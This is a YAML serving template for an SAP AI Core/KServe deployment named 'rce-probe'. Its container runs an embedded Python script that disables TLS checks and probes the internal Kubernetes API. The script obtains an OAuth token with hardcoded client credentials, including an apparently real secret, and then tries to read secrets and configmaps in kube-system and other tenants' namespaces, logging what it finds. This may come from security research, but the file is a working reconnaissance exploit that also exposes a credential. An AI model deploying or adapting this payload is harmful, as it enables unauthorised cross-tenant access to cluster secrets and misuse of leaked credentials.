apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "3.0.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "k8s-api-oidc-xsuaa-probe"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import urllib.request, urllib.error, ssl, os, json, socket, base64

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            k8s_host = os.environ.get('KUBERNETES_SERVICE_HOST', '')
            k8s_port = os.environ.get('KUBERNETES_SERVICE_PORT_HTTPS', '443')
            k8s_base = f'https://{k8s_host}:{k8s_port}'
            k8s_ip_base = 'https://100.104.0.1:443'

            print('[PROBE_V3_START]', flush=True)
            print('[K8S_HOST]', k8s_host, flush=True)
            print('[K8S_BASE]', k8s_base, flush=True)

            # --- resolve hostname ---
            try:
                ip = socket.gethostbyname(k8s_host)
                print('[DNS_RESOLVE]', k8s_host, '->', ip, flush=True)
            except Exception as e:
                print('[DNS_RESOLVE_ERR]', e, flush=True)

            def k8s_req(path, token=None, base=None):
                url = (base or k8s_base) + path
                h = {}
                if token: h['Authorization'] = f'Bearer {token}'
                rq = urllib.request.Request(url, headers=h)
                try:
                    with urllib.request.urlopen(rq, timeout=6, context=ctx) as r:
                        body = r.read(2000).decode(errors='replace')
                        return r.status, dict(r.headers), body
                except urllib.error.HTTPError as e:
                    try: body = e.read(1000).decode(errors='replace')
                    except: body = ''
                    return e.code, dict(e.headers), body
                except Exception as ex:
                    return 0, {}, str(ex)[:150]

            # --- unauthenticated probes (read response bodies) ---
            for path in ['/healthz', '/readyz', '/livez', '/version',
                         '/.well-known/openid-configuration',
                         '/api', '/apis', '/api/v1']:
                code, hdrs, body = k8s_req(path)
                print(f'[K8S_UNAUTH:{path}] {code} | hdrs={list(hdrs.keys())[:5]} | {body[:300]}', flush=True)

            # --- try same via ClusterIP directly ---
            for path in ['/healthz', '/version', '/.well-known/openid-configuration']:
                code, hdrs, body = k8s_req(path, base=k8s_ip_base)
                print(f'[K8S_IP:{path}] {code} | {body[:200]}', flush=True)

            # --- get XSUAA token and try it against k8s API ---
            xsuaa_token = ''
            try:
                creds = base64.b64encode(
                    b'sb-aicore-bb-12!b627551|aicore-xsuaa-std!b563784:aicore-bb-12-key\$gbdxl0aC0lXqLFQwlGFyB2cqAAHsAen7wWYqOl89fbw='
                ).decode()
                rq2 = urllib.request.Request(
                    'https://cf-aicore-security-bb-12.authentication.eu10.hana.ondemand.com/oauth/token',
                    data=b'grant_type=client_credentials',
                    headers={'Authorization': f'Basic {creds}', 'Content-Type': 'application/x-www-form-urlencoded'})
                with urllib.request.urlopen(rq2, timeout=10, context=ctx) as r:
                    xsuaa_token = json.loads(r.read()).get('access_token', '')
                    print('[XSUAA_OK]', xsuaa_token[:40], '...', flush=True)
            except Exception as e:
                print('[XSUAA_ERR]', e, flush=True)

            if xsuaa_token:
                for path in ['/api', '/apis', '/version', '/api/v1/namespaces',
                             '/api/v1/namespaces/rg-0d70dc91-cd927cab',
                             '/api/v1/namespaces/rg-0d70dc91-cd927cab/secrets',
                             '/api/v1/namespaces/rg-0d70dc91-cd927cab/configmaps']:
                    code, hdrs, body = k8s_req(path, token=xsuaa_token)
                    print(f'[K8S_XSUAA:{path}] {code} | {body[:400]}', flush=True)

            # --- check OIDC discovery on the hostname-based API ---
            # if OIDC is configured we can learn what auth methods are accepted
            oidc_path = '/.well-known/openid-configuration'
            code, hdrs, body = k8s_req(oidc_path)
            print('[OIDC_DISC]', code, body[:500], flush=True)

            # --- scan interesting paths for leaked data ---
            extra_paths = [
                '/api/v1/nodes',
                '/api/v1/namespaces/kube-system/configmaps',
                '/api/v1/namespaces/kube-system/secrets',
                '/apis/rbac.authorization.k8s.io/v1/clusterroles',
                '/apis/metrics.k8s.io/v1beta1/nodes',
                '/api/v1/namespaces/mt-0d70dc91/secrets',
                '/api/v1/namespaces/openai-api/secrets',
                '/api/v1/namespaces/aicore/secrets',
                '/api/v1/namespaces/orchestration/secrets',
            ]
            for path in extra_paths:
                code, hdrs, body = k8s_req(path, token=xsuaa_token)
                if code not in (401, 403, 0):
                    print(f'[K8S_HIT:{path}] {code} | {body[:500]}', flush=True)
                else:
                    print(f'[K8S_DENIED:{path}] {code}', flush=True)

            print('[PROBE_V3_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
